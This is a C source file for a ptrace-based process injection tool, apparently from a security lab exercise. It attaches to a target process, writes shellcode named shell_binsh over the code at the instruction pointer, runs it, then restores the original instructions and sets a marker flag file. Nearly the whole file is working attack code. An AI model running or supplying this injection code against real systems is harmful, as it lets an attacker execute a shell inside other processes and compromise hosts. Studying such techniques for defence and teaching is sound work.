#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <errno.h>
#include "lab_common.h"

#ifdef __x86_64__
#  define USER_ORIG_RAX (8 * 17)
#else
#  define USER_ORIG_RAX (8 * 11)
#endif

void ptrace_readmem(pid_t child, unsigned long addr, unsigned char *buf, int len) {
    union { long val; unsigned char bytes[sizeof(long)]; } data;
    int i = 0, words = len / sizeof(long), rem = len % sizeof(long);
    for (; i < words; i++) {
        data.val = ptrace(PTRACE_PEEKDATA, child, addr + i * sizeof(long), NULL);
        memcpy(buf + i * sizeof(long), data.bytes, sizeof(long));
    }
    if (rem) {
        data.val = ptrace(PTRACE_PEEKDATA, child, addr + i * sizeof(long), NULL);
        memcpy(buf + i * sizeof(long), data.bytes, rem);
    }
}

void ptrace_writemem(pid_t child, unsigned long addr, unsigned char *buf, int len) {
    union { long val; unsigned char bytes[sizeof(long)]; } data;
    int i = 0, words = len / sizeof(long), rem = len % sizeof(long);
    for (; i < words; i++) {
        memcpy(data.bytes, buf + i * sizeof(long), sizeof(long));
        ptrace(PTRACE_POKEDATA, child, addr + i * sizeof(long), data.val);
    }
    if (rem) {
        memcpy(data.bytes, buf + i * sizeof(long), rem);
        ptrace(PTRACE_POKEDATA, child, addr + i * sizeof(long), data.val);
    }
}

int inject_ptrace(pid_t target_pid) {
    struct user_regs_struct old_regs, new_regs;
    unsigned char backup[256];

    printf("[*] Ptrace Injection - Target PID: %d\n", target_pid);

    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
        perror("[-] ptrace attach failed");
        return -1;
    }
    waitpid(target_pid, NULL, 0);
    printf("[+] Attached to process\n");

    ptrace(PTRACE_GETREGS, target_pid, NULL, &old_regs);
    printf("[+] RIP: 0x%llx\n", old_regs.rip);

    int slen = shell_binsh_len;
    ptrace_readmem(target_pid, old_regs.rip, backup, slen);
    ptrace_writemem(target_pid, old_regs.rip, shell_binsh, slen);
    printf("[+] Shellcode written at RIP\n");

    memcpy(&new_regs, &old_regs, sizeof(new_regs));
    ptrace(PTRACE_SETREGS, target_pid, NULL, &new_regs);
    ptrace(PTRACE_POKEUSER, target_pid, USER_ORIG_RAX, (void *)1);
    ptrace(PTRACE_CONT, target_pid, NULL, NULL);
    sleep(1);

    kill(target_pid, SIGSTOP);
    waitpid(target_pid, NULL, 0);
    printf("[+] Restoring original instructions\n");
    ptrace_writemem(target_pid, old_regs.rip, backup, slen);
    ptrace(PTRACE_SETREGS, target_pid, NULL, &old_regs);
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
    kill(target_pid, SIGCONT);
    printf("[+] Ptrace injection complete - process restored\n");

    set_flag("/tmp/.ptrace_injection_active");
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <pid>\n", argv[0]);
        return 1;
    }
    pid_t pid = atoi(argv[1]);
    return inject_ptrace(pid);
}
